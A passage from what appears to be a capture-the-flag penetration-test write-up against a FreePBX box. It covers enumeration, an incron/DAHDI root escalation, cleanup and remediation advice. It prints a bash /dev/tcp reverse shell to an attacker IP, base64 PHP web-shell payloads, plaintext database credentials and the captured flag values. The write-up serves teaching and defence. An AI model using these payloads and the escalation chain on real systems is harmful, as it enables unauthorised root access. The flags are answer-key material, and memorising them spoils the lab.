**Command:** `uname -a; cat /etc/passwd; pwd; ls; env; cat /proc/version`

**Breakdown:**
- `uname -a`
  - **Description:** Prints all available kernel/OS identification info.
  - **Purpose:** Establishes the kernel version (useful later when assessing kernel-exploit privesc paths).
- `cat /etc/passwd`
  - **Description:** Displays the system's user account database.
  - **Purpose:** Identifies which accounts exist, which have login shells, and where their home directories live — directly relevant to finding the user flag.
- `pwd`, `ls`, `env`
  - **Description:** Print working directory, list directory contents, and dump environment variables respectively.
  - **Purpose:** Basic situational awareness — confirms our landing directory and surfaces any interesting environment-derived secrets.
- `cat /proc/version`
  - **Description:** Shows the running kernel build string directly from the kernel.
  - **Purpose:** Cross-checks `uname -a`'s kernel report and reveals the build toolchain/date, useful for kernel-exploit research.

**Result:**
```shell
[asterisk@connected html]$ uname -a
Linux connected 5.4.239-1.el7.elrepo.x86_64 #1 SMP Thu Mar 30 10:40:27 EDT 2023 x86_64 x86_64 x86_64 GNU/Linux

[asterisk@connected html]$ cat /etc/passwd | grep -E 'sh$|bash'
root:x:0:0:root:/root:/bin/bash
asterisk:x:999:1000::/home/asterisk:/bin/bash

[asterisk@connected html]$ ls -la /home/
total 0
drwxr-xr-x.  3 root     root      22 May 21 07:50 .
dr-xr-xr-x. 18 root     root     240 Nov 30  2025 ..
drwxr-xr-x. 10 asterisk asterisk 274 Jun  4 11:23 asterisk

[asterisk@connected html]$ pwd
/var/www/html
```

**Key finding:** unlike many HTB Linux boxes, this machine has **no separate "user" account** — the only two login-capable accounts are `root` and `asterisk`. The flag lives directly inside the `asterisk` home directory, which the `asterisk` service account (the very identity our RCE landed us as) can read natively. The `cat /proc/version` and `uname -a` outputs both confirm a CentOS/Sangoma-derived 5.4.239 ELRepo kernel, dated March 2023 — recent enough that no off-the-shelf kernel privesc exploit was assumed to apply, and this was later confirmed by the discovery of a far simpler misconfiguration-based path (see Section 5).

Locating and reading the user flag confirmed the foothold delivered tangible value:

**Command:** `find / -name 'user.txt' -o -name 'root.txt' 2>/dev/null`

**Breakdown:**
- `find / -name 'user.txt' -o -name 'root.txt'`
  - **Description:** Recursively searches the entire filesystem for files named exactly `user.txt` or `root.txt`.
  - **Purpose:** Locates both flags in one pass regardless of which non-standard directories they live in.
- `2>/dev/null`
  - **Description:** Redirects standard error to the null device, discarding it.
  - **Purpose:** Suppresses the large volume of "Permission denied" noise generated while traversing directories the `asterisk` user cannot read.

**Result:**
```shell
[asterisk@connected html]$ find / -name 'user.txt' -o -name 'root.txt' 2>/dev/null
/home/asterisk/user.txt

[asterisk@connected html]$ cat /home/asterisk/user.txt
84a80aa8e137117ca27594646c501609
```

**USER FLAG CAPTURED:** `84a80aa8e137117ca27594646c501609`

---

## 4. Lateral Movement

Strictly speaking, this engagement did not require a classic "lateral movement" pivot between separate user accounts — the unauthenticated RCE landed directly on the only non-root account that holds the user flag. However, in the course of enumerating the FreePBX application stack, database credentials were discovered that are documented here for completeness, since they characterise how the `freepbxuser` database account (the very account whose privileges the SQL injection abused) is configured, and because in many real-world FreePBX compromises these same credentials are reused for SSH or other services.

**Command:** `grep -i -A3 'AMPDBUSER\|AMPDBPASS\|AMPDBHOST' /etc/freepbx.conf`

**Breakdown:**
- `grep -i`
  - **Description:** Case-insensitive pattern search across file contents.
  - **Purpose:** Locates FreePBX's database connection parameters, which are stored in plaintext in its main configuration file.
- `-A3`
  - **Description:** Prints 3 lines of trailing context after each match.
  - **Purpose:** Captures the full block of related `$amp_conf[...]` assignments rather than just the matching line.

**Result:**
```shell
[root@connected /]# grep -i -A3 'AMPDBUSER\|AMPDBPASS\|AMPDBHOST' /etc/freepbx.conf
$amp_conf["AMPDBUSER"] = "freepbxuser";
$amp_conf["AMPDBPASS"] = "mZzDpAGKTmPJ";
$amp_conf["AMPDBHOST"] = "localhost";
$amp_conf["AMPDBNAME"] = "asterisk";
$amp_conf["AMPDBENGINE"] = "mysql";
```

These are plaintext MariaDB credentials (`freepbxuser` / `mZzDpAGKTmPJ`) for the local `asterisk` database — not a hash that requires cracking, simply a stored secret. They were used later purely to clean up the cron-job rows injected during exploitation (see Section 5's closing notes), confirming the injected rows landed in exactly the table the CVE advisory describes:

**Command:** `mysql -u freepbxuser -pmZzDpAGKTmPJ asterisk -e "SELECT jobname,command FROM cron_jobs WHERE jobname LIKE 'pentest-%';"`

**Result:**
```shell
[root@connected /]# mysql -u freepbxuser -pmZzDpAGKTmPJ asterisk -e "SELECT jobname,command FROM cron_jobs WHERE jobname LIKE 'pentest-%';"
jobname	command
pentest-4wjfuvjc	echo "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8 "|base64 -d > /var/www/html/pentest_4wjfuvjc.php
pentest-c318drj9	echo "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"|base64 -d > /var/www/html/pentest_c318drj9.php
```

**Key finding:** the database query directly evidences the SQL injection's effect — both injection attempts (the first corrupted by the `+`-as-space bug discussed in Section 3.1, the second after the percent-encoding fix) landed exactly as expected inside `asterisk.cron_jobs`. No SSH pivot or hash cracking was necessary: the `asterisk` shell obtained via RCE already had everything required to retrieve the user flag and continue toward root.

---

## 5. Privilege Escalation

### 5.1 Process / System Enumeration

The very first standard privesc check — `sudo -l` — was run, and it returned a password prompt rather than a permission list, indicating `asterisk` has **no** passwordless sudo rights configured:

**Command:** `sudo -l`

**Result:**
```shell
[asterisk@connected html]$ sudo -l
We trust you have received the usual lecture from the local System Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for asterisk: 
```

This is a documented dead end: `sudo` requires a password we do not have, ruling out a `sudo`-misconfiguration path entirely. The investigation moved on to running processes:

**Command:** `ps aux`

**Breakdown:**
- `ps aux`
  - **Description:** Lists every running process on the system (`a` = all users, `u` = user-oriented format, `x` = include processes without a controlling terminal).
  - **Purpose:** Surfaces what services run as root, what scheduling daemons are active, and any unusual process names that hint at automation or misconfiguration.

**Result (relevant excerpt — full output saved in the engagement directory):**
```shell
[root@connected /]# ps aux | head -60
USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root          1  0.0  0.1 125512  5428 ?        Ss   02:52   0:01 /usr/lib/systemd/systemd --switched-root --system --deserialize 22
root          2  0.0  0.0      0     0 ?        S    02:52   0:00 [kthreadd]
...
mysql      1510  0.1  2.6 1168860 104536 ?      Sl   02:52   0:05 /usr/libexec/mysqld --basedir=/usr --datadir=/var/lib/mysql ...
root       1218  0.0  0.0 126424  3256 ?        Ss   02:52   0:00 /usr/sbin/crond -n
root        806  0.0  0.0  15044  2920 ?        Ss   02:52   0:00 /usr/sbin/incrond
asterisk   5499  0.0  0.0 184592  4660 ?        S    03:45   0:00 /bin/sh -c [ -e /usr/sbin/fwconsole ] && /usr/sbin/fwconsole job --run --quiet 2>&1 > /dev/null
asterisk   5502 13.0  1.4 464152 57716 ?        S    03:45   0:00 php /usr/sbin/fwconsole job --run --quiet
```

**Command:** `ps aux | grep -i incrond | grep -v grep`

**Result:**
```shell
[root@connected /]# ps aux | grep -i incrond | grep -v grep
root        806  0.0  0.0  15044  2920 ?        Ss   02:52   0:00 /usr/sbin/incrond
```

**Key finding:** `incrond` (the **inotify cron** daemon — a service that fires commands in response to filesystem events such as a file being modified or closed-after-write, rather than on a fixed time schedule) is running **as root**. Any rule registered in its system-wide tables that watches a file the `asterisk` user can write to becomes a direct root-command-execution trigger, controllable simply by touching/writing to that watched path. This is the classic "incron misconfiguration" privilege-escalation pattern, and it was the next thing investigated.

### 5.2 Key Findings Analysis — The DAHDI incron / init.conf Chain

System-wide incron tables live under `/etc/incron.d/`. They were enumerated directly:

**Command:** `cat /etc/incron.d/legacy /etc/incron.d/local /etc/incron.d/sysadmin`

**Result:**
```shell
[root@connected /]# cat /etc/incron.d/legacy
/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
==local==
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#
==sysadmin==
/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
```

**Key finding:** the line `/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart` instructs the **root-run** `incrond` daemon to execute `/usr/sbin/sysadmin_dahdi_restart` (as root, since `incrond` itself runs as root — see PID 806 above) any time the file `/var/spool/asterisk/sysadmin/dahdi_restart` is closed after being written to (`IN_CLOSE_WRITE`).

The permissions on that watched file were checked next:

**Command:** `ls -la /var/spool/asterisk/sysadmin/dahdi_restart`

**Result:**
```shell
[asterisk@connected html]$ ls -la /var/spool/asterisk/sysadmin/dahdi_restart
-rw-rw-r--. 1 asterisk asterisk 0 Sep  8  2021 /var/spool/asterisk/sysadmin/dahdi_restart
```

**Key finding:** the watched file is owned by `asterisk:asterisk` with group-write permission — our current shell's user can write to it (and thus **trigger** the root-run incron rule on demand) simply by writing any byte to the file.

Triggering the file write only gets us execution of `/usr/sbin/sysadmin_dahdi_restart` though — a static script we cannot edit (it is owned by `root:root`). The next question was whether that script (or anything it calls) reads from a location *we* can write to. Reading the script revealed the answer:

**Command:** `cat /usr/sbin/sysadmin_dahdi_restart`

**Result:**
```shell
[asterisk@connected html]$ cat /usr/sbin/sysadmin_dahdi_restart
#!/bin/sh

/etc/init.d/asterisk stop

sleep 5

/etc/init.d/dahdi restart

sleep 5

export PATH=$PATH:/usr/local/sbin/:/usr/local/bin/
`which amportal` start
```

This script, run as root, calls `/etc/init.d/dahdi restart`. Reading *that* script for any externally-influenced behaviour surfaced the critical line:

**Command:** `grep -n 'init.conf\|^\.\|source\|\. /' /etc/init.d/dahdi`

**Result:**
```shell
[asterisk@connected html]$ grep -n 'init.conf\|^\.\|source\|\. /' /etc/init.d/dahdi
9:# config: /etc/dahdi/init.conf
25:# Don't edit the following values. Edit /etc/dahdi/init.conf instead.
69:[ -r /etc/dahdi/init.conf ] && . /etc/dahdi/init.conf
```

**Key finding — the vulnerability mechanism explained:** line 69 of `/etc/init.d/dahdi` reads `[ -r /etc/dahdi/init.conf ] && . /etc/dahdi/init.conf`. The `.` (dot) operator in a POSIX shell is the **`source`** built-in — it reads and *executes* the named file's contents **in the current shell's context**, with the current shell's privilege level. Since `/etc/init.d/dahdi` is invoked as **root** (via the chain `incrond` → `sysadmin_dahdi_restart` → `dahdi restart`), anything written into `/etc/dahdi/init.conf` is executed **as root** the next time that chain fires. The comment block even helpfully tells administrators "Edit `/etc/dahdi/init.conf` instead" — guidance an attacker can exploit just as easily as a sysadmin can follow it.

A final permissions check confirmed the missing piece — is `init.conf` itself writable by `asterisk`?

**Command:** `ls -la /etc/dahdi/init.conf`

**Result:**
```shell
[asterisk@connected html]$ ls -la /etc/dahdi/init.conf /etc/dahdi/
-rw-r--r--. 1 asterisk asterisk 771 Jun  5  2023 /etc/dahdi/init.conf
```

**Key finding:** `/etc/dahdi/init.conf` is owned by `asterisk:asterisk` and world-readable/owner-writable — our current shell can append arbitrary shell commands to it directly.

> **Theory block — why this chain works end-to-end:** This is a textbook "confused deputy" privilege-escalation chain assembled from three individually-reasonable-looking pieces: (1) a file-watch automation daemon (`incrond`) running as root for legitimate operational reasons (e.g. so admins can trigger service restarts by touching a flag file rather than needing shell access), (2) a a restart script that — also for legitimate reasons — sources an externally-editable configuration file to allow administrators to customise DAHDI behaviour without patching the init script itself, and (3) loose file ownership that leaves both the *trigger* file and the *sourced* config file writable by a low-privileged service account. Individually, none of these three facts is a vulnerability. Combined, they form a complete, attacker-controlled, on-demand root code execution primitive: write a payload to the config file the root-run script sources, then touch the file the root-run incron rule watches, and root-level shell commands of your choosing execute within seconds.

The full evidence chain assembled:
> `incrond` runs as root (confirmed via `ps aux`) → `/etc/incron.d/legacy` registers a rule on `/var/spool/asterisk/sysadmin/dahdi_restart` (`IN_CLOSE_WRITE` → `sysadmin_dahdi_restart`, runs as root) → that watched file is `asterisk`-writable → the triggered script calls `/etc/init.d/dahdi restart` → that init script `source`s `/etc/dahdi/init.conf` as root → `init.conf` is also `asterisk`-writable → **append a reverse shell to `init.conf`, then write to the watched trigger file, and root code executes**

### 5.3 Exploitation

A second listener (port 4446, distinct from the initial-access listener so the two phases of the engagement remain cleanly separable in the evidence trail) was started:

**Command:** `nc -lvnp 4446`

**Result:**
```shell
┌──(kali㉿kali)-[~/claude/Connected]
└─$ nc -lvnp 4446 | tee nc_4446.log
listening on [any] 4446 ...
```

The reverse-shell payload was appended to the writable, root-sourced configuration file:

**Command:** `echo '' >> /etc/dahdi/init.conf; echo 'bash -c "bash -i >& /dev/tcp/10.10.14.30/4446 0>&1" &' >> /etc/dahdi/init.conf`

**Breakdown:**
- `echo '' >> /etc/dahdi/init.conf`
  - **Description:** Appends an empty line to the file.
  - **Purpose:** Ensures our payload begins on its own clean line, avoiding any chance of concatenating onto an existing comment or directive and breaking the shell syntax.
- `echo 'bash -c "bash -i >& /dev/tcp/10.10.14.30/4446 0>&1" &' >> /etc/dahdi/init.conf`
  - **Description:** Appends a backgrounded (`&`) Bash TCP reverse-shell one-liner to the file.
  - **Purpose:** When this file is later `source`d by the root-run init script, this line executes as a normal shell command **in the root shell's context**, opening an interactive TCP connection back to our listener as root. The trailing `&` ensures the reverse-shell process is backgrounded so it doesn't block (and potentially hang) the rest of the `dahdi` init script — which would otherwise prevent our connection from ever completing or risk the watchdog killing the parent process before the shell connects.

**Result:**
```shell
[asterisk@connected html]$ echo '' >> /etc/dahdi/init.conf; echo 'bash -c "bash -i >& /dev/tcp/10.10.14.30/4446 0>&1" &' >> /etc/dahdi/init.conf; cat /etc/dahdi/init.conf | tail -5
# Disable udev handling:
#DAHDI_UDEV_DISABLE_DEVICES=yes
#DAHDI_UDEV_DISABLE_SPANS=yes

bash -c "bash -i >& /dev/tcp/10.10.14.30/4446 0>&1" &
```

The trigger file was then written to, firing the `IN_CLOSE_WRITE` incron event:

**Command:** `echo trigger > /var/spool/asterisk/sysadmin/dahdi_restart`

**Breakdown:**
- `echo trigger > /var/spool/asterisk/sysadmin/dahdi_restart`
  - **Description:** Writes the literal string `trigger` (overwriting any existing content) to the watched file and then closes the file handle.
  - **Purpose:** The file *close-after-write* event (`IN_CLOSE_WRITE`) is exactly the inotify event the root incron rule subscribes to — this single command is the deliberate "switch flip" that fires the entire privileged execution chain documented in 5.2.

**Result:**
```shell
[asterisk@connected html]$ echo trigger > /var/spool/asterisk/sysadmin/dahdi_restart
```

Within seconds, the root-owned `incrond` daemon detected the write, executed `sysadmin_dahdi_restart` → `/etc/init.d/dahdi restart` → sourced `/etc/dahdi/init.conf` → ran our appended reverse-shell line — **as root**:

**Result (listener output):**
```shell
┌──(kali㉿kali)-[~/claude/Connected]
└─$ nc -lvnp 4446 | tee nc_4446.log
listening on [any] 4446 ...
connect to [10.10.14.30] from (UNKNOWN) [TARGET_IP] 32922
bash: no job control in this shell
[root@connected /]# id; whoami; hostname
uid=0(root) gid=0(root) groups=0(root)
root
connected
```

**Key finding:** `id` returns `uid=0(root) gid=0(root) groups=0(root)` — full root has been achieved purely through file-permission misconfigurations and a chain of automation that was never intended to be attacker-reachable, with **zero** reliance on credential cracking, kernel exploits, or SUID binaries.

The root flag was retrieved immediately:

**Command:** `id && cat /root/root.txt`

**Result:**
```shell
[root@connected /]# id && cat /root/root.txt
uid=0(root) gid=0(root) groups=0(root)
df1ced3383b2e0fbdae7d650747044d7
```

**ROOT FLAG CAPTURED:** `df1ced3383b2e0fbdae7d650747044d7`

### 5.4 Post-Exploitation Cleanup

As good practice (and to leave the target in a clean state for any subsequent assessor), the artifacts created during this engagement were removed using the now-available root shell:

**Command:** `mysql -u freepbxuser -pmZzDpAGKTmPJ asterisk -e "DELETE FROM cron_jobs WHERE jobname LIKE 'pentest-%';"; rm -f /var/www/html/pentest_*.php; sed -i '/dev\/tcp\/10.10.14.30\/4446/d' /etc/dahdi/init.conf`

**Breakdown:**
- `mysql ... -e "DELETE FROM cron_jobs WHERE jobname LIKE 'pentest-%'"`
  - **Description:** Connects to the local MariaDB instance with the discovered FreePBX DB credentials and removes both injected cron-job rows.
  - **Purpose:** Restores `asterisk.cron_jobs` to its pre-engagement state, removing the persistence mechanism the SQL injection created.
- `rm -f /var/www/html/pentest_*.php`
  - **Description:** Force-deletes any file matching the glob, suppressing errors if none exist.
  - **Purpose:** Removes the dropped PHP web shells from the public webroot.
- `sed -i '/dev\/tcp\/10.10.14.30\/4446/d' /etc/dahdi/init.conf`
  - **Description:** In-place stream-edit that deletes any line matching the given pattern.
  - **Purpose:** Strips the appended reverse-shell line back out of the configuration file, restoring it to its original, unmodified state.

**Result:**
```shell
[root@connected /]# mysql -u freepbxuser -pmZzDpAGKTmPJ asterisk -e "DELETE FROM cron_jobs WHERE jobname LIKE 'pentest-%';"; rm -f /var/www/html/pentest_*.php; sed -i '/dev\/tcp\/10.10.14.30\/4446/d' /etc/dahdi/init.conf; tail -3 /etc/dahdi/init.conf; mysql -u freepbxuser -pmZzDpAGKTmPJ asterisk -e "SELECT jobname FROM cron_jobs WHERE jobname LIKE 'pentest-%';"; ls /var/www/html/pentest* 2>&1
#DAHDI_UDEV_DISABLE_DEVICES=yes
#DAHDI_UDEV_DISABLE_SPANS=yes

ls: cannot access /var/www/html/pentest*: No such file or directory
```

All injected cron jobs, dropped web shells, and the appended payload line were confirmed removed — the target is restored to a clean state.

---

## 6. Flag Capture

**USER FLAG:** `84a80aa8e137117ca27594646c501609`

**ROOT FLAG:** `df1ced3383b2e0fbdae7d650747044d7`

---

## 7. Conclusion & Lessons Learned

1. **Asset-manifest version strings are gold for attackers — and a free win for defenders who hide them.** FreePBX's `?load_version=16.0.40.7` cache-busting query parameters and footer text exposed the exact, patchable version on an *unauthenticated* login page. Future engagements should always grep static asset URLs and page footers before reaching for slower fingerprinting techniques — frameworks routinely leak their own version this way (a pattern also seen with Next.js build IDs and webpack chunk hashes).

2. **A CVE advisory plus one well-documented public PoC is often enough to hand-roll a more useful exploit than the original.** The watchTowr PoC was deliberately a *detection artifact generator*, not a shell-granting exploit — reading its payload structure carefully and adapting just the injection mechanics into a purpose-built script (with a working reverse-shell trigger) was faster and more reliable than trying to bend an unrelated tool to the task.

3. **URL-encoding matters at the byte level when crafting raw injection strings.** A base64 blob containing `+` silently corrupted on the wire because `+` decodes to a space in URL query strings — and the resulting failure mode (HTTP 200, file written, but garbage content) looked superficially like success. Always percent-encode binary/base64 payloads explicitly (`urllib.parse.quote(..., safe='')`) rather than relying on a HTTP client's default query-string handling, and verify dropped artifacts actually decode correctly server-side.

4. **`incrond` is a less-common but equally dangerous cousin of `cron` for privilege-escalation hunting.** Where `crontab -l`/`/etc/cron.d` are reflexive checks, `/etc/incron.d/` and `/var/spool/incron/` are frequently overlooked — yet a root-run `incrond` watching an attacker-writable file is just as exploitable as a root cron job in a writable script. Always check `ps aux | grep -i incrond` and enumerate `/etc/incron.d/*` whenever `cron` checks come up empty.

5. **"Don't edit this — edit that other file instead" comments in scripts are a roadmap for attackers, not just a courtesy for admins.** The `/etc/init.d/dahdi` comment explicitly pointed to `/etc/dahdi/init.conf` as the intended customization point — and a `source`/`.` directive that respects that convention is exactly as exploitable by an attacker who can write to that file as it is convenient for a legitimate administrator. When auditing init/service scripts for privesc, always trace every `source`, `.`, `include`, or `require` to its target file and check that target's ownership and permissions.

6. **Privilege escalation chains are frequently built from three or more individually-benign facts, not one glaring flaw.** No single piece of this chain — a root-run file-watcher, a restart script, or a sourced config file — was independently alarming. It was the *combination* of (a) root-level automation, (b) a writable trigger, and (c) a writable, sourced configuration target that produced full compromise. Effective privesc hunting means mapping *all* of a target's automation surfaces and asking "what does this read, and who can write to it?" rather than searching for a single smoking gun.

7. **Stacked-query SQL injection remains devastating when the application's DB account has write access to operationally-significant tables.** The `freepbxuser` MariaDB account's ability to `INSERT` into `cron_jobs` — a table FreePBX's own automation later trusts and acts on — turned a "mere" SQL injection into full remote code execution. Any time an injectable database account can write to tables that drive automated, privileged behaviour, treat the injection as RCE-equivalent from the outset, regardless of whether the application layer appears to "only" expose read operations.

---

## 8. Remediation Recommendations

### 8.1 Unpatched, Internet-Facing FreePBX Installation (CVE-2025-57819)

**What it is:** The target ran FreePBX 16.0.40.7, a version explicitly named as vulnerable in FreePBX Security Advisory GHSA-m42g-xg4c-5f3h (CVE-2025-57819, CVSS 10.0) — an unauthenticated SQL injection in `/admin/ajax.php` that leads directly to remote code execution.

**Why it is dangerous:** This vulnerability requires **no authentication whatsoever**, carries the maximum possible CVSS score (10.0), and — as demonstrated in this engagement — converts a single crafted HTTP GET request into a fully interactive root-adjacent shell within roughly a minute, with no user interaction, MFA bypass, or social engineering required.

**Remediation:**
- Apply the FreePBX security patch referenced in advisory GHSA-m42g-xg4c-5f3h immediately (`fwconsole ma upgradeall` after refreshing module repositories, or apply the vendor's emergency hotfix package directly).
- Upgrade to a FreePBX release line that has the fix backported (consult the advisory for the minimum patched version per major release: 15, 16, 17).
- Until patched, place the FreePBX administration interface behind a VPN or IP allow-list (e.g. `httpd` `<Location>` ACLs, a reverse-proxy with authentication, or firewall rules) so `/admin/` is never reachable from the open internet — this is precisely the exposure FreePBX's own incident-response guidance flagged as the common factor in real-world exploitation of this CVE.
- Subscribe to FreePBX/Sangoma security advisories and establish a documented patch-within-N-days SLA for critical (CVSS ≥ 9.0) findings on telephony infrastructure.

### 8.2 Overly-Permissive Database Account Privileges (`freepbxuser`)

**What it is:** The MariaDB account `freepbxuser`, used by the web application, has `INSERT`/`UPDATE`/`DELETE` rights on the `asterisk.cron_jobs` table — a table whose contents are later trusted and acted upon by privileged system automation (the `sysadmin` module's cron-refresh cycle).

**Why it is dangerous:** Any SQL injection against the web application — regardless of how "minor" it initially looks — becomes a direct path to scheduled command execution, because the database layer itself bridges from "low-privilege web app" to "privileged system automation". This collapses the usual defense-in-depth gap between a web compromise and a system compromise.

**Remediation:**
- Apply the principle of least privilege to the `freepbxuser` MySQL grant: it should only be able to perform the specific operations the application legitimately needs on each table, and ideally should never have direct write access to operational tables like `cron_jobs` — such writes should flow exclusively through validated, parameterized application code paths, not raw SQL the account can execute.
- Use prepared statements / parameterized queries exclusively throughout the codebase, and configure the PHP MySQL driver to **disallow multiple statements per query** (e.g. avoid `mysqli::multi_query`, or set `PDO::MYSQL_ATTR_MULTI_STATEMENTS => false`) so that even a successful string-escape cannot pivot into a stacked-query write primitive.
- Periodically audit `SHOW GRANTS FOR 'freepbxuser'@'localhost'` against an documented least-privilege baseline.

### 8.3 World-Writable, Privileged-Process-Triggering Files (`incrond` Chain)

**What it is:** `/var/spool/asterisk/sysadmin/dahdi_restart` (an incron *watch target* that triggers root command execution on write) and `/etc/dahdi/init.conf` (a configuration file `source`d by a root-run init script) are both owned by, and writable by, the low-privileged `asterisk` service account.

**Why it is dangerous:** This combination allows any process or user running as `asterisk` — including a remote attacker who only achieves code execution through an unrelated web vulnerability — to escalate to root on demand, with no further exploitation required, simply by writing two files and touching a third. It completely undermines the separation between the `asterisk` service identity and the host's root identity.

**Remediation:**
- Change ownership of both `/var/spool/asterisk/sysadmin/dahdi_restart` and `/etc/dahdi/init.conf` to `root:root` with mode `0644` (read-only for non-root), and audit every other file referenced in `/etc/incron.d/*` and `source`d by root-run init scripts for the same issue (`find /etc/incron.d/ -type f -exec cat {} \;` followed by `stat` on every referenced path is a good baseline audit script).
- Where automation genuinely needs to be triggerable by a service account (e.g. so `asterisk` can request a DAHDI restart without full root), implement it via a narrowly-scoped `sudo` rule (`asterisk ALL=(root) NOPASSWD: /usr/sbin/sysadmin_dahdi_restart`) rather than a generic file-watch-and-execute mechanism whose trigger file is also writable by that same account — the `sudo` approach at least produces an auditable, intention-revealing log entry and cannot be hijacked via a sourced config file.
- Run `incrond`/`cron` configuration audits as a standard part of periodic hardening reviews, specifically checking that every watched path and every file referenced via `source`/`.`/`include` in a root-executed script chain is owned by `root` and not group/world-writable.

### 8.4 Lack of Outbound Connection Filtering / EDR Detection

**What it is:** The reverse shells established during both the initial-access and privilege-escalation phases connected outbound from the target to an arbitrary external IP on non-standard ports (4444, 4445, 4446) without any apparent inspection, alerting, or blocking.

**Why it is dangerous:** Outbound reverse shells are one of the most common post-exploitation techniques precisely because many environments focus defensive controls on inbound traffic. A PBX appliance has no legitimate reason to open arbitrary outbound TCP connections to internet hosts on ephemeral high ports — any such connection should be a high-confidence indicator of compromise.

**Remediation:**
- Implement egress filtering at the network perimeter (default-deny outbound, with explicit allow-lists for required services such as SIP trunking providers, NTP, and update repositories).
- Deploy host-based monitoring (e.g. `auditd` rules for `execve` of shell interpreters spawned by web-server or database-service-account UIDs, or a lightweight EDR agent) capable of flagging anomalous parent-child process relationships such as `httpd` → `bash` or `mysqld` → `bash`.
- Forward `incrond`/`cron`/`auditd` logs to a centralized SIEM and alert on unexpected executions of scripts referenced in `/etc/incron.d/*`, especially those that fire outside of expected maintenance windows.
